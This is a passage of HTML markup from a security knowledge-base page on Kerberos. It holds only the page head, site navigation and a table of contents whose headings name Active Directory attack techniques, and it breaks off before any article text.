



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Kerberos - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#protocol-summary" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Kerberos
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases-sqlserver/" title="Databases sqlserver" class="md-nav__link">
      Databases sqlserver
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../dfir/" title="Dfir" class="md-nav__link">
      Dfir
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../osint/" title="Osint" class="md-nav__link">
      Osint
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../rf-and-sdr/" title="Rf and sdr" class="md-nav__link">
      Rf and sdr
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../wifi/" title="Wifi" class="md-nav__link">
      Wifi
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../windows-active-directory/" title="Windows active directory" class="md-nav__link">
      Windows active directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30" type="checkbox" id="nav-30">
    
    <label class="md-nav__link" for="nav-30">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-30">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/cissp/" title="Cissp" class="md-nav__link">
      Cissp
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/osce/" title="Osce" class="md-nav__link">
      Osce
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30-3" type="checkbox" id="nav-30-3">
    
    <label class="md-nav__link" for="nav-30-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-30-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30-3-9" type="checkbox" id="nav-30-3-9">
    
    <label class="md-nav__link" for="nav-30-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-30-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30-3-9-10" type="checkbox" id="nav-30-3-9-10">
    
    <label class="md-nav__link" for="nav-30-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-30-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31" type="checkbox" id="nav-31">
    
    <label class="md-nav__link" for="nav-31">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-31">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/azuer/" title="Azuer" class="md-nav__link">
      Azuer
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-32" type="checkbox" id="nav-32" checked>
    
    <label class="md-nav__link" for="nav-32">
      Identity and access management
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-32">
        Identity and access management
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../jwt/" title="Jwt" class="md-nav__link">
      Jwt
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Kerberos
      </label>
    
    <a href="./" title="Kerberos" class="md-nav__link md-nav__link--active">
      Kerberos
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#protocol-summary" class="md-nav__link">
    Protocol Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#protocol-flow" class="md-nav__link">
    Protocol Flow
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#client-kdc-pre-auth-kerberos-5" class="md-nav__link">
    Client - KDC (Pre-Auth) (Kerberos 5+)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#client-service-authentication" class="md-nav__link">
    Client - Service Authentication
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inter-forest-authentication" class="md-nav__link">
    Inter-forest Authentication
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#services-microsoft-implementation" class="md-nav__link">
    Services (Microsoft Implementation)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#krbtgt-password" class="md-nav__link">
    krbtgt password
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#formats" class="md-nav__link">
    Formats
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-patterns" class="md-nav__link">
    Attack Patterns
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kerberoast" class="md-nav__link">
    Kerberoast
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tips" class="md-nav__link">
    Tips
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-1-service-provider-name-spn-and-spn-discovery" class="md-nav__link">
    Step 1 - Service Provider Name (SPN) and SPN Discovery
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#setspn" class="md-nav__link">
    SetSPN
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getuserspns" class="md-nav__link">
    GetUserSPNs
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-ad-recon" class="md-nav__link">
    PowerShell AD Recon
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershellery" class="md-nav__link">
    PowerShellery
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    Impacket
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-2-request-service-tickets" class="md-nav__link">
    Step 2 - Request Service Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-3-export-service-tickets" class="md-nav__link">
    Step 3 - Export Service Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-4-crack-service-tickets" class="md-nav__link">
    Step 4 - Crack Service Tickets
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#step-5-rewrite-service-tickets-ram-injection" class="md-nav__link">
    Step 5 - Rewrite Service Tickets &amp; RAM Injection
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
    Golden Ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#silver-tickets" class="md-nav__link">
    Silver Tickets
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-service-accounts" class="md-nav__link">
    Find Service Accounts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#request-spn-ticket" class="md-nav__link">
    Request SPN Ticket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#save-tieket" class="md-nav__link">
    Save Tieket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforce" class="md-nav__link">
    Bruteforce
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smart-card-authentication-with-dh-keys" class="md-nav__link">
    Smart Card Authentication with DH Keys
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-windows-pki" class="md-nav__link">
    Attacking Windows PKI
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#kerberos-delegation" class="md-nav__link">
    Kerberos Delegation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unconstrained-kerberos-delegation" class="md-nav__link">
    Unconstrained Kerberos Delegation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identifying-nodes-with-unconstrained-delegation-enabled" class="md-nav__link">
    Identifying Nodes with Unconstrained Delegation Enabled
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-pattern" class="md-nav__link">
    Attack Pattern
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#constrained-kerberos-delegation" class="md-nav__link">
    Constrained Kerberos Delegation
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identifying-users-with-unconstrained-delegation-enabled" class="md-nav__link">
    Identifying Users with Unconstrained Delegation Enabled
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#attack-patterns_1" class="md-nav__link">
    Attack Patterns
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacks" class="md-nav__link">
    Attacks
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reference" class="md-nav__link">
    Reference:
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../oauth2-and-oidc/" title="Oauth2 and oidc" class="md-nav__link">
      Oauth2 and oidc
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33" type="checkbox" id="nav-33">
    
    <label class="md-nav__link" for="nav-33">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-33">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1" type="checkbox" id="nav-33-1">
    
    <label class="md-nav__link" for="nav-33-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-33-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/api/" title="Windows API" class="md-nav__link">
      Windows API
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/applocker/" title="Applocker" class="md-nav__link">
      Applocker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/events/" title="Events" class="md-nav__link">
      Events
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/hyperv/" title="HyperV" class="md-nav__link">
      HyperV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-endpoints/" title="Important Endpoints" class="md-nav__link">
      Important Endpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-issues/" title="Important issues" class="md-nav__link">
      Important issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-reg-locations/" title="Important Registry Locations" class="md-nav__link">
      Important Registry Locations
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/kernel-exploitation/" title="Kernel Exploitation" class="md-nav__link">
      Kernel Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/user-accounts/" title="User accounts" class="md-nav__link">
      User accounts
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/wmi/" title="Wmi" class="md-nav__link">
      Wmi
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/x-Bypass/" title="Defense Bypass" class="md-nav__link">
      Defense Bypass
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/x-Defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1-22" type="checkbox" id="nav-33-1-22">
    
    <label class="md-nav__link" for="nav-33-1-22">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-33-1-22">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1-23" type="checkbox" id="nav-33-1-23">
    
    <label class="md-nav__link" for="nav-33-1-23">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-33-1-23">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-34" type="checkbox" id="nav-34">
    
    <label class="md-nav__link" for="nav-34">
      Protocols and ports
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-34">
        Protocols and ports
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../protocols-and-ports/Portmapper-111/" title="Portmapper 111" class="md-nav__link">
      Portmapper 111
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../protocols-and-ports/RPC-135,445/" title="RPC 135,445" class="md-nav__link">
      RPC 135,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/" title="SMB Samba NetBIOS 135 139,445" class="md-nav__link">
      SMB Samba NetBIOS 135 139,445
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#protocol-summary" class="md-nav__link">
    Protocol Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#protocol-flow" class="md-nav__link">
    Protocol Flow
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#client-kdc-pre-auth-kerberos-5" class="md-nav__link">
    Client - KDC (Pre-Auth) (Kerberos 5+)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#client-service-authentication" class="md-nav__link">
    Client - Service Authentication
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inter-forest-authentication" class="md-nav__link">
    Inter-forest Authentication
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#services-microsoft-implementation" class="md-nav__link">
    Services (Microsoft Implementation)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#krbtgt-password" class="md-nav__link">
    krbtgt password
  </a>
  
</li>
        
          <li class="md-nav__item">
